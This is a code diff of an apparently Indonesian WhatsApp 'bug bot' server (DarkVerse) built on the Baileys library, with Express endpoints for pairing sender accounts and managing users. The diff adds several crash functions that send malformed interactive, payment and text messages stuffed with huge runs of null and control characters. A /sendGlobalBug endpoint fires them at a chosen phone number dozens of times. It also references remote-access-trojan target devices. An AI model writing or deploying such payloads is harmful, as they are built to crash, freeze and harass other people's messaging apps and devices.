+      console.log(`[📁 GLOBAL] Found creds in root for ${sender.sessionName}, moving...`);
+      fs.writeFileSync(credsFile, fs.readFileSync(mainCredsFile));
+      if (!activeConnections[sender.sessionName]) {
+        await connectSession(sessionPath, sender.sessionName);
+      }
+    } else {
+      console.log(`[❌ GLOBAL] No creds found for ${sender.sessionName}, need to re-pair`);
+      if (activeConnections[sender.sessionName]) {
+        delete activeConnections[sender.sessionName];
+      }
+    }
+  }
+}
+
+// 3. Tambahkan endpoint untuk cek status koneksi global sender
+app.get("/checkGlobalSenders", (req, res) => {
+  const { key } = req.query;
+  const username = getUserByKey(key);
+  if (!username) return res.json({ valid: false, message: "Invalid key" });
+  
+  const db = loadDatabase();
+  const user = db.find(u => u.username === username);
+  if (!user || !allowedRolesForGlobal.includes(user.role)) {
+    return res.json({ valid: false, message: "Access denied" });
+  }
+  
+  const globalSenders = loadGlobalSenders();
+  const statusList = globalSenders.map(sender => {
+    const isConnected = !!activeConnections[sender.sessionName];
+    const hasCreds = fs.existsSync(path.join('permenmd', sender.sessionName, 'creds.json'));
+    
+    return {
+      id: sender.id,
+      number: sender.number,
+      sessionName: sender.sessionName,
+      connected: isConnected,
+      hasCreds: hasCreds,
+      owner: sender.owner,
+      addedAt: sender.addedAt
+    };
+  });
+  
+  res.json({
+    valid: true,
+    total: globalSenders.length,
+    connected: statusList.filter(s => s.connected).length,
+    senders: statusList
+  });
+});
+
+// 4. Tambahkan endpoint reconnect manual
+app.post("/reconnectGlobalSender", async (req, res) => {
+  const { key, senderId } = req.body;
+  const username = getUserByKey(key);
+  if (!username) return res.json({ valid: false, message: "Invalid key" });
+  
+  const db = loadDatabase();
+  const user = db.find(u => u.username === username);
+  if (!user || !allowedRolesForGlobal.includes(user.role)) {
+    return res.json({ valid: false, message: "Access denied" });
+  }
+  
+  const globalSenders = loadGlobalSenders();
+  const sender = globalSenders.find(s => s.id === senderId);
+  
+  if (!sender) {
+    return res.json({ valid: false, message: "Global sender not found" });
+  }
+  
+  // Tutup koneksi lama
+  if (activeConnections[sender.sessionName]) {
+    try {
+      activeConnections[sender.sessionName].ws?.close();
+      delete activeConnections[sender.sessionName];
+    } catch(e) {}
+  }
+  
+  // Delay sebentar
+  await new Promise(r => setTimeout(r, 1000));
+  
+  // Reconnect
+  const sessionPath = path.join('permenmd', sender.sessionName);
+  if (fs.existsSync(sessionPath) && fs.existsSync(path.join(sessionPath, 'creds.json'))) {
+    await connectSession(sessionPath, sender.sessionName);
+    res.json({ valid: true, message: `Reconnecting ${sender.number}...`, sessionName: sender.sessionName });
+  } else {
+    res.json({ valid: false, message: "Session credentials not found, please re-pair" });
+  }
+});
+
+// 5. Perbaiki fungsi getGlobalPairing agar lebih reliable
+app.get("/getGlobalPairing", async (req, res) => {
+  const { key, number } = req.query;
+  const username = getUserByKey(key);
+  if (!username) return res.json({ valid: false, message: "Invalid session key" });
+
+  const db = loadDatabase();
+  const user = db.find(u => u.username === username);
+  
+  if (!user || !allowedRolesForGlobal.includes(user.role)) {
+    return res.json({ valid: false, message: "Only Owner, High, Admin, High Admin, Dev can add global senders" });
+  }
+
+  if (!number || number.length < 9) {
+    return res.json({ valid: false, message: "Valid number required" });
+  }
+
+  const cleanNumber = number.replace(/\D/g, '');
+  const sessionName = `global_${cleanNumber}`;
+  const sessionDir = path.join('permenmd', sessionName);
+
+  try {
+    // Buat folder session
+    if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
+    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
+
+    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+    const { version } = await fetchLatestBaileysVersion();
+
+    const sock = makeWASocket({
+      auth: state,
+      printQRInTerminal: false,
+      logger: pino({ level: "silent" }),
+      version: version,
+      defaultQueryTimeoutMs: undefined,
+    });
+
+    sock.ev.on("creds.update", saveCreds);
+
+    sock.ev.on("connection.update", async (update) => {
+      const { connection, lastDisconnect } = update;
+
+      if (connection === "close") {
+        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
+        if (!isLoggedOut) {
+          console.log(`🔄 Global sender ${cleanNumber} disconnected, will retry...`);
+        } else {
+          console.log(`🚪 Global sender ${cleanNumber} logged out`);
+          delete activeConnections[sessionName];
+        }
+      } else if (connection === "open") {
+        console.log(`✅ Global sender ${sessionName} connected successfully!`);
+        activeConnections[sessionName] = sock;
+        
+        // Simpan creds ke root juga
+        const sourceCreds = path.join(sessionDir, 'creds.json');
+        const destCreds = path.join('permenmd', `${sessionName}.json`);
+        if (fs.existsSync(sourceCreds)) {
+          fs.writeFileSync(destCreds, fs.readFileSync(sourceCreds));
+        }
+        
+        // Simpan ke database globalSenders.json
+        const globalSenders = loadGlobalSenders();
+        const existingIndex = globalSenders.findIndex(s => s.number === cleanNumber);
+        const newId = Date.now().toString();
+        
+        const senderData = {
+          id: existingIndex !== -1 ? globalSenders[existingIndex].id : newId,
+          sessionName: sessionName,
+          number: cleanNumber,
+          owner: username,
+          addedAt: new Date().toISOString()
+        };
+        
+        if (existingIndex !== -1) {
+          globalSenders[existingIndex] = senderData;
+        } else {
+          globalSenders.push(senderData);
+        }
+        saveGlobalSenders(globalSenders);
+      }
+    });
+
+    if (!sock.authState.creds.registered) {
+      await new Promise(r => setTimeout(r, 1000));
+      let code = await sock.requestPairingCode(cleanNumber);
+      if (code) {
+        console.log(`[🌐 GLOBAL] Pairing code for ${cleanNumber}: ${code}`);
+        return res.json({ 
+          valid: true, 
+          number: cleanNumber, 
+          pairingCode: code,
+          isGlobal: true,
+          sessionName: sessionName
+        });
+      }
+    }
+    
+    // Jika sudah terdaftar, langsung return success
+    return res.json({
+      valid: true,
+      message: "Global sender already registered",
+      number: cleanNumber,
+      isGlobal: true
+    });
+
+  } catch (err) {
+    console.error("Global pairing error:", err.message);
+    return res.status(500).json({ valid: false, error: err.message });
+  }
+});
+
+// ============ UPDATE UI ENDPOINTS ============
+
+// Get all senders (private + global) untuk ditampilkan di APK
+app.get("/getAllSenders", (req, res) => {
+  const { key } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
+  
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user) return res.json({ valid: false, message: "User not found" });
+  
+  // Get private senders
+  const privateConns = getActiveCredsInFolder(user.username);
+  const privateSenders = privateConns.map(c => ({
+    id: c.sessionName,
+    sessionName: c.sessionName,
+    number: c.sessionName,
+    type: "private",
+    status: "connected",
+    isGlobal: false
+  }));
+  
+  // Get global senders (only if user has access)
+  let globalSendersList = [];
+  if (["owner", "dev", "pemilikan", "admin"].includes(user.role)) {
+    const globalSenders = loadGlobalSenders();
+    globalSendersList = globalSenders.map(s => ({
+      id: s.id,
+      sessionName: s.sessionName,
+      number: s.number,
+      type: "global",
+      status: activeConnections[s.sessionName] ? "connected" : "disconnected",
+      isGlobal: true,
+      owner: s.owner
+    }));
+  }
+  
+  res.json({
+    valid: true,
+    senders: [...privateSenders, ...globalSendersList],
+    privateCount: privateSenders.length,
+    globalCount: globalSendersList.length
+  });
+});
+
+// ============ ONLINE USERS & ACTIVE CONNECTIONS ENDPOINTS ============
 
 app.get("/onlineUsers", (req, res) => {
     const { key } = req.query;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     const onlineUsers = loadOnlineUsers();
     const activeNow = onlineUsers.filter(u => {
@@ -1637,7 +2511,7 @@ app.get("/onlineUsers", (req, res) => {
 app.post("/updateOnlineUser", (req, res) => {
     const { key, username, androidId } = req.body;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     const onlineUsers = loadOnlineUsers();
     const existing = onlineUsers.findIndex(u => u.username === username);
@@ -1661,18 +2535,18 @@ app.post("/updateOnlineUser", (req, res) => {
 app.post("/removeOnlineUser", (req, res) => {
     const { key, username } = req.body;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
-    // ✅ HEARTBEAT: stop timer + hapus dari list
-    try { stopUserHeartbeat(username); } catch(e) {}
-    
+    let onlineUsers = loadOnlineUsers();
+    onlineUsers = onlineUsers.filter(u => u.username !== username);
+    saveOnlineUsers(onlineUsers);
     res.json({ valid: true });
 });
 
 app.get("/activeConnections", (req, res) => {
     const { key } = req.query;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     const activeConns = loadActiveConnections();
     const activeNow = activeConns.filter(c => {
@@ -1690,7 +2564,7 @@ app.get("/activeConnections", (req, res) => {
 app.post("/updateActiveConnection", (req, res) => {
     const { key, sessionName, type } = req.body;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     const activeConns = loadActiveConnections();
     const existing = activeConns.findIndex(c => c.sessionName === sessionName);
@@ -1714,7 +2588,7 @@ app.post("/updateActiveConnection", (req, res) => {
 app.post("/removeActiveConnection", (req, res) => {
     const { key, sessionName } = req.body;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     let activeConns = loadActiveConnections();
     activeConns = activeConns.filter(c => c.sessionName !== sessionName);
@@ -1727,7 +2601,7 @@ app.post("/removeActiveConnection", (req, res) => {
 app.get("/chat/messages", (req, res) => {
     const { key, limit = 100 } = req.query;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     const messages = loadChatMessages();
     const limited = messages.slice(-parseInt(limit));
@@ -1742,7 +2616,7 @@ app.get("/chat/messages", (req, res) => {
 app.post("/chat/send", (req, res) => {
     const { key, message, username } = req.body;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     if (!message || message.trim().length === 0) {
         return res.json({ valid: false, error: "Message cannot be empty" });
@@ -1776,7 +2650,7 @@ app.delete("/chat/delete/:id", (req, res) => {
     const { key } = req.query;
     const { id } = req.params;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     const db = loadDatabase();
     const user = db.find(u => u.username === keyInfo.username);
@@ -1800,9 +2674,9 @@ app.delete("/chat/delete/:id", (req, res) => {
 app.get("/chat/online-users", (req, res) => {
     const { key } = req.query;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
-    const onlineUsers = loadOnlineUsers();
+    const onlineUsers = loadOnlineChatUsers();
     const activeNow = onlineUsers.filter(u => {
         const lastActive = new Date(u.lastActive);
         return (Date.now() - lastActive) < 60000;
@@ -1818,9 +2692,9 @@ app.get("/chat/online-users", (req, res) => {
 app.post("/chat/online", (req, res) => {
     const { key, username } = req.body;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
-    let onlineUsers = loadOnlineUsers();
+    let onlineUsers = loadOnlineChatUsers();
     const existing = onlineUsers.findIndex(u => u.username === username);
     
     if (existing !== -1) {
@@ -1833,7 +2707,7 @@ app.post("/chat/online", (req, res) => {
         });
     }
     
-    saveOnlineUsers(onlineUsers);
+    saveOnlineChatUsers(onlineUsers);
     
     broadcastToChatClients({
         type: 'user_online',
@@ -1847,11 +2721,11 @@ app.post("/chat/online", (req, res) => {
 app.post("/chat/offline", (req, res) => {
     const { key, username } = req.body;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
-    let onlineUsers = loadOnlineUsers();
+    let onlineUsers = loadOnlineChatUsers();
     onlineUsers = onlineUsers.filter(u => u.username !== username);
-    saveOnlineUsers(onlineUsers);
+    saveOnlineChatUsers(onlineUsers);
     
     broadcastToChatClients({
         type: 'user_offline',
@@ -2120,6 +2994,57 @@ async function importFromRawEncrypted(url) {
 
 let bugWa;
 
+async function KayzenBlankClick(sock, target) {
+    await sock.relayMessage(target, {
+        interactiveMessage: {
+            body: { text: "Kayzen Is Here" },
+            nativeFlowMessage: {
+                messageParamsJson: JSON.stringify({
+                    "flow_action": "navigate",
+                    "flow_action_payload": { "screen": "VOID" }
+                }),
+                buttons: [
+                    {
+                        name: "quick_reply",
+                        buttonParamsJson: JSON.stringify({
+                            "id": "VOID-V5",
+                            "display_text": "BYPASS" + "\x10".repeat(50000)
+                        })
+                    },
+                    {
+                        name: "cta_url",
+                        buttonParamsJson: JSON.stringify({
+                            "id": "Kayzen",
+                            "display_text": "VnX MobilCrasher",
+                            "url": "t.me/bagasreall" + "\x10".repeat(50000)
+                        })
+                    }
+                ]
+            }
+        }
+    }, { participant: { jid: target } });
+}
+
+
+async function sepongGb(sock, groupJid) {
+   const msg = {
+      interactiveMessage: {
+         nativeFlowMessage: {
+            buttons: [{
+               name: "payment_info",
+               buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
+            }]
+         }
+      }
+   };
+
+   const prepared = await generateWAMessageFromContent(groupJid, msg, {});
+   await sock.relayMessage(groupJid, prepared.message, {
+      messageId: prepared.key.id
+   });
+}
+
+
 async function VnXNewDenglayHardInpis(sock, target) {
     let vnxmbg = {
       groupStatusMessageV2: {
@@ -2157,72 +3082,91 @@ async function VnXNewDenglayHardInpis(sock, target) {
   });
 }
 
-async function fconemsg(sock, target) {
-  try {
-    const VisiLoad = "꧀".repeat(25000);
-    await sock.relayMessage(target, {
-      productMessage: {
-        product: {
-          productImage: {
-            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQNVJiaPtq4Sbf8CxOoOzzjG0MhQfcEYp5a3RFKcWBSVcbpL-t5yDfR0nH5aJAUinpDS6rCsfN--747mOTiF-oaiO97W41SndL8DiveF6w?ccb=9-4&oh=01_Q5Aa3AE1L5Iz4vV7dLKJBsOGPtCrs08G_-y0L0rO6KMSMEj4rg&oe=694A1259&_nc_sid=e6ed6c&mms3=true",
-            mimetype: "image/jpeg",
-            fileSha256: "DqRi9X3lEDH7WJSqb6E1njeawZZkIg8DTHZgdIga+E8=",
-            fileLength: "72103",
-            mediaKey: "Mt4oRen73PaURrUvv9vLJTPNBQoUlbNNtVr4D7FziAw=",
-            fileEncSha256: "okpg3oYPwe/ndLcMdIPy0gtyYl/wvC9WurHeekXWTOk=",
-            directPath: "/o1/v/t24/f2/m232/AQNVJiaPtq4Sbf8CxOoOzzjG0MhQfcEYp5a3RFKcWBSVcbpL-t5yDfR0nH5aJAUinpDS6rCsfN--747mOTiF-oaiO97W41SndL8DiveF6w?ccb=9-4&oh=01_Q5Aa3AE1L5Iz4vV7dLKJBsOGPtCrs08G_-y0L0rO6KMSMEj4rg&oe=694A1259&_nc_sid=e6ed6c",
-            mediaKeyTimestamp: "1763881206",
-            width: -99999999999999999999, 
-            height: 1,
-            jpegThumbnail: null,
-            productId: "9783476898425051",
-            title: "OCEAN MODS " + VisiLoad,
-            description: "UI MODS" + VisiLoad, 
-            currencyCode: "IDR",
-            priceAmount1000: "X",
-            retailerId: "BAN011",
-            productImageCount: 2,
-            salePriceAmount1000: "50000000"
-          }
-        },
-        businessOwnerJid: target
-      }
-    }, { participant: { jid: target } });
-    await new Promise(resolve => setTimeout(resolve, 50000));
-    let VoidTeam = "X - TEAM";
-    let MyTeam = "ြ".repeat(1500);
-    const PayCrash = {
-      requestPaymentMessage: {
-        currencyCodeIso4217: 'IDR',
-        requestFrom: target, 
-        expiryTimestamp: Date.now() + 8000, 
-        amount: {
-          value: 999999999, 
-          offset: 100, 
-          currencyCode: 'IDR'
-        },
-        contextInfo: {
-          externalAdReply: {
-            title: VoidTeam,
-            body: MyTeam,
-            mimetype: 'audio/mpeg',
-            caption: MyTeam,
-            showAdAttribution: true,
-            sourceUrl: 'https://t.me/aboutvils',
-            thumbnailUrl: 'https://files.catbox.moe/tpoa34.jpg'
-          }
+
+async function VnXNewDelayHardInpis(sock, target) {
+  await sock.relayMessage(
+    target,
+    {
+      groupStatusMessageV2: {
+        message: {
+          interactiveMessage: {
+             body: {
+              text: "VnX" + "\n"
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "[".repeat(10000),
+              buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
+            }
+          }
         }
-      }
-    };
-    await sock.relayMessage(target, PayCrash, {
-      participant: { jid: target },
-      messageId: null,
-      userJid: target,
-      quoted: null
+      }
+    },
+    {
+      participant: { jid: target }
+    }
+  );
+}
+
+
+async function KayzenDelayHard(sock, target) {
+    await sock.relayMessage(target, {
+        extendedTextMessage: {
+            text: "Kayzen Delay Hards" + "\u0000".repeat(25000),
+            contextInfo: {
+                stanzaId: "Vnx-" + Date.now(),
+                participant: target,
+                mentionedJid: Array.from({ length: 1500 }, () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net"),
+                quotedMessage: {
+                    documentMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7119-24/dummy.enc",
+                        mimetype: "application/pdf",
+                        fileName: "CRASH_PROTOCOL_" + "\u0000".repeat(25000),
+                        fileLength: "9999999999",
+                        pageCount: 2147483647,
+                        caption: "\u0000".repeat(25000) + "\x10".repeat(25000),
+                        interactiveMessage: {
+                            header: { title: "\u0000".repeat(25000) },
+                            body: { text: "MASTER_OVERFLOW" },
+                            footer: { text: "\u0000".repeat(25000) },
+                            nativeFlowMessage: {
+                                name: "address_message",
+                                paramsJson: JSON.stringify({
+                                    "address_message": "\u0000".repeat(25000),
+                                    "galaxy_message": "\u0000".repeat(25000),
+                                    "call_permission_request": "\u0000".repeat(25000),
+                                    "cta_url": "https://wa.me/settings",
+                                    "cta_reminder": "\u0000".repeat(25000),
+                                    "wa_flow_response": {
+                                        "quick_reply": "\x10".repeat(25000),
+                                        "buttons": "\u0000".repeat(25000)
+                                    }
+                                }),
+                                version: 3
+                            }
+                        },
+                        listMessage: {
+                            title: "Delay",
+                            listType: 1,
+                            sections: [{ title: "CORE", rows: [{ title: "EXECUTE", description: "\u0000".repeat(25000) }] }]
+                        }
+                    }
+                }
+            }
+        },
+        interactiveResponseMessage: {
+            nativeFlowResponseMessage: {
+                name: "call_permission_request",
+                paramsJson: JSON.stringify({
+                    "data": "\u0000".repeat(25000),
+                    "quick_reply": "\x10".repeat(25000)
+                }),
+                version: 3
+            }
+        }
+    }, {
+        messageId: "Vnx-" + Date.now(),
+        participant: { jid: target }
     });
-  } catch (error) {
-    console.error("error:", error);
-  }
 }
 
 async function urlloc(client, target) { 
@@ -2497,18 +3441,9 @@ async function connectSession(folderPath, sessionName, retries = 100) {
             mess[sessionName] = sock;
           }
 
-          // ✅ HEARTBEAT: catat sesi ini sebagai Active Connection
-          try {
-            const ownerFolder = path.basename(path.dirname(folderPath));
-            startSessionHeartbeat(sessionName, ownerFolder, type || 'sender');
-          } catch(e) { console.error('[HB] startSessionHeartbeat error:', e.message); }
-
           resolve();
         } else if (connection === "close") {
           console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);
-
-          // ✅ HEARTBEAT: hapus sesi dari Active Connections
-          try { stopSessionHeartbeat(sessionName); } catch(e) {}
 
           if (statusCode === 440) {
             delete activeConnections[sessionName];
@@ -2612,13 +3547,9 @@ async function pairingWa(number, owner, attempt = 1) {
         await pairingWa(number, owner, attempt + 1);
       } else {
         delete activeConnections[number];
-        // ✅ HEARTBEAT: hapus dari active connections saat logout
-        try { stopSessionHeartbeat(number); } catch(e) {}
       }
     } else if (connection === "open") {
       activeConnections[number] = sock;
-      // ✅ HEARTBEAT: catat nomor ini sebagai Active Connection
-      try { startSessionHeartbeat(number, owner, 'sender'); } catch(e) { console.error('[HB] error:', e.message); }
       const sourceCreds = path.join(sessionDir, 'creds.json');
       const destCreds = path.join('permenmd', owner, `${number}.json`);
 
@@ -2639,6 +3570,13 @@ try {
 }
 
 async function startUserSessions() {
+  // Pastikan folder permenmd ada sebelum di-scan
+  if (!fs.existsSync('permenmd')) {
+    fs.mkdirSync('permenmd', { recursive: true });
+    console.log('[STARTUP] Folder permenmd dibuat otomatis.');
+    return; // Tidak ada session untuk di-restore
+  }
+
   const subfolders = fs.readdirSync('permenmd')
     .map(name => path.join('permenmd', name))
     .filter(p => fs.lstatSync(p).isDirectory());
@@ -2974,7 +3912,7 @@ bot.onText(/^\/?status$/, async (msg) => {
     const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;
 
     const pingStart = Date.now();
-    await axios.get(`http://localhost:${PORT}/ping`);
+    await axios.get(`http://beli-panel-dialxzy.alxzyy.my.id:${PORT}/ping`);
     const ping = Date.now() - pingStart;
 
     const text = `*DarkVerse Server Status*
@@ -3190,105 +4128,11 @@ function getUptime() {
   return `${h}j ${m}m ${s}d`;
 }
 
-// ============ HEARTBEAT: ONLINE USER & ACTIVE CONNECTION ============
-// Map untuk track heartbeat interval per user/session
-const _heartbeatTimers = {};
-
-/**
- * Mulai heartbeat untuk user (Online Users counter)
- * Dipanggil saat user login ke app
- */
-function startUserHeartbeat(username, androidId, key) {
-  const hbKey = `user_${username}`;
-  if (_heartbeatTimers[hbKey]) return; // Sudah jalan
-
-  const tick = () => {
-    const users = loadOnlineUsers();
-    const idx = users.findIndex(u => u.username === username);
-    const userData = {
-      username,
-      androidId: androidId || 'unknown',
-      lastActive: new Date().toISOString(),
-      role: (() => {
-        try {
-          const db = loadDatabase();
-          return db.find(u => u.username === username)?.role || 'member';
-        } catch { return 'member'; }
-      })()
-    };
-    if (idx !== -1) users[idx] = userData;
-    else users.push(userData);
-    saveOnlineUsers(users);
-    console.log(`💓 [OnlineUser] Heartbeat: ${username}`);
-  };
-
-  tick(); // Langsung ping pertama kali
-  _heartbeatTimers[hbKey] = setInterval(tick, 30000);
-  console.log(`🟢 [OnlineUser] Heartbeat dimulai untuk ${username}`);
-}
-
-/**
- * Hentikan heartbeat user + hapus dari online list
- */
-function stopUserHeartbeat(username) {
-  const hbKey = `user_${username}`;
-  if (_heartbeatTimers[hbKey]) {
-    clearInterval(_heartbeatTimers[hbKey]);
-    delete _heartbeatTimers[hbKey];
-  }
-  const users = loadOnlineUsers().filter(u => u.username !== username);
-  saveOnlineUsers(users);
-  console.log(`🔴 [OnlineUser] Heartbeat berhenti: ${username}`);
-}
-
-/**
- * Mulai heartbeat untuk sesi WA (Active Connections counter)
- * Dipanggil saat connection === "open"
- */
-function startSessionHeartbeat(sessionName, ownerUsername, type) {
-  const hbKey = `sess_${sessionName}`;
-  if (_heartbeatTimers[hbKey]) return; // Sudah jalan
-
-  const tick = () => {
-    const conns = loadActiveConnections();
-    const idx = conns.findIndex(c => c.sessionName === sessionName);
-    const connData = {
-      sessionName,
-      type: type || 'unknown',
-      owner: ownerUsername || 'unknown',
-      lastActive: new Date().toISOString()
-    };
-    if (idx !== -1) conns[idx] = connData;
-    else conns.push(connData);
-    saveActiveConnections(conns);
-    console.log(`💓 [ActiveConn] Heartbeat: ${sessionName} [${type}]`);
-  };
-
-  tick();
-  _heartbeatTimers[hbKey] = setInterval(tick, 30000);
-  console.log(`🟢 [ActiveConn] Heartbeat dimulai untuk ${sessionName}`);
-}
-
-/**
- * Hentikan heartbeat sesi WA + hapus dari active connections
- * Dipanggil saat connection === "close"
- */
-function stopSessionHeartbeat(sessionName) {
-  const hbKey = `sess_${sessionName}`;
-  if (_heartbeatTimers[hbKey]) {
-    clearInterval(_heartbeatTimers[hbKey]);
-    delete _heartbeatTimers[hbKey];
-  }
-  const conns = loadActiveConnections().filter(c => c.sessionName !== sessionName);
-  saveActiveConnections(conns);
-  console.log(`🔴 [ActiveConn] Heartbeat berhenti: ${sessionName}`);
-}
-// ============ END HEARTBEAT ============
-
 // ============ TAMBAHAN: FILE UNTUK MENYIMPAN DATA ============
 const ONLINE_USERS_FILE = './online_users.json';
 const ACTIVE_CONNECTIONS_FILE = './active_connections.json';
 const CHAT_ROOM_FILE = './chat_room.json';
+const ONLINE_CHAT_USERS_FILE = './online_chat_users.json';
 
 // Load online users
 function loadOnlineUsers() {
@@ -3325,6 +4169,17 @@ function loadChatMessages() {
 function saveChatMessages(messages) {
     const limited = messages.slice(-500);
     fs.writeFileSync(CHAT_ROOM_FILE, JSON.stringify(limited, null, 2));
+}
+
+function loadOnlineChatUsers() {
+    try {
+        if (!fs.existsSync(ONLINE_CHAT_USERS_FILE)) fs.writeFileSync(ONLINE_CHAT_USERS_FILE, JSON.stringify([]));
+        return JSON.parse(fs.readFileSync(ONLINE_CHAT_USERS_FILE, 'utf8'));
+    } catch(e) { return []; }
+}
+
+function saveOnlineChatUsers(users) {
+    fs.writeFileSync(ONLINE_CHAT_USERS_FILE, JSON.stringify(users, null, 2));
 }
 
 // ============ ROLE PERMISSIONS ============
@@ -3561,27 +4416,6 @@ bot.onText(/^\/?restart$/, async (msg) => {
   }, 5000);
 });
 
-const GLOBAL_SENDER_FILE = path.join(__dirname, 'globalSenders.json');
-
-function loadGlobalSenders() {
-  try {
-    if (!fs.existsSync(GLOBAL_SENDER_FILE)) {
-      fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify([]));
-      return [];
-    }
-    return JSON.parse(fs.readFileSync(GLOBAL_SENDER_FILE, 'utf8'));
-  } catch (err) {
-    console.error("Failed to load global senders:", err.message);
-    return [];
-  }
-}
-
-function saveGlobalSenders(senders) {
-  fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify(senders, null, 2));
-}
-
-const allowedRolesForGlobal = ["owner", "high", "admin", "high admin", "dev"];
-
 app.get("/globalSender", (req, res) => {
   const { key } = req.query;
   const username = getUserByKey(key);
@@ -3645,13 +4479,9 @@ app.get("/getGlobalPairing", async (req, res) => {
           await waiting(3000);
         } else {
           delete activeConnections[sessionName];
-          // ✅ HEARTBEAT: hapus dari active connections
-          try { stopSessionHeartbeat(sessionName); } catch(e) {}
         }
       } else if (connection === "open") {
         activeConnections[sessionName] = sock;
-        // ✅ HEARTBEAT: catat sesi global sebagai Active Connection
-        try { startSessionHeartbeat(sessionName, sessionName, 'global_sender'); } catch(e) {}
         const sourceCreds = path.join(sessionDir, 'creds.json');
         const destCreds = path.join('permenmd', `${sessionName}.json`);
         if (fs.existsSync(sourceCreds)) {
@@ -3801,20 +4631,38 @@ app.get("/sendGlobalBug", async (req, res) => {
       const targetJid = target + "@s.whatsapp.net";
       
       switch (bug) {
-        case "click":
-          for (let i = 0; i < 15; i++) {
-            await fconemsg(sock, targetJid);
+        case "BebasSpam":
+          for (let i = 0; i < 20; i++) {
+            await KayzenDelayHard(sock, targetJid);
             await sleep(1000);
           }
           break;
-        case "android":
-          for (let i = 0; i < 20; i++) {
+        case "HardDX":
+          for (let i = 0; i < 100; i++) {
+            await VnXNewDelayHardInpis(sock, targetJid);
+            await sleep(1000);
+          }
+           break;
+        case "Crash?":
+          for (let i = 0; i < 30; i++) {
             await urlloc(sock, targetJid);
             await sleep(1000);
           }
           break;
+        case "Xblank":
+          for (let i = 0; i < 20; i++) {
+            await KayzenBlankClick(sock, targetJid);
+            await sleep(1000);
+          }
+          break;
+        case "delaygb":
+          for (let i = 0; i < 50; i++) {
+            await sepongGB(sock, targetJid);
+            await sleep(1000);
+          }
+          break;
         case "invisible":
-          for (let i = 0; i < 200; i++) {
+          for (let i = 0; i < 50; i++) {
             await VnXNewDenglayHardInpis(sock, targetJid);
             await sleep(1000);
           }
@@ -3885,58 +4733,85 @@ app.get("/rat/pairid", (req, res) => {
 });
 
 app.get("/rat/my-devices", (req, res) => {
-    const { key } = req.query;
-    const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
-    
-    const db = loadDatabase();
-    const user = db.find(u => u.username === keyInfo.username);
-    if (!user) return res.status(404).json({ valid: false });
-    
-    const targets = readRat(RAT_TARGETS);
-    let devices = [];
-    
-    if (user.role === "owner" || user.role === "dev") {
-        devices = targets.filter(t => t.owner === user.username);
-    } else {
-        const perms = loadDevicePerms();
-        const userPerm = perms[user.username.toLowerCase()];
-        if (userPerm && userPerm.approved) {
-            if (userPerm.allDevices) {
-                const owner = db.find(u => u.role === "owner");
-                if (owner) devices = targets.filter(t => t.owner === owner.username);
-            } else {
-                devices = targets.filter(t => userPerm.devices?.includes(t.id));
-            }
-        }
+  const { key } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user) return res.json({ valid: false, message: "User not found" });
+
+  const targets = readRat(RAT_TARGETS);
+
+  // Owner & Dev: lihat semua device milik mereka (by username atau pairId)
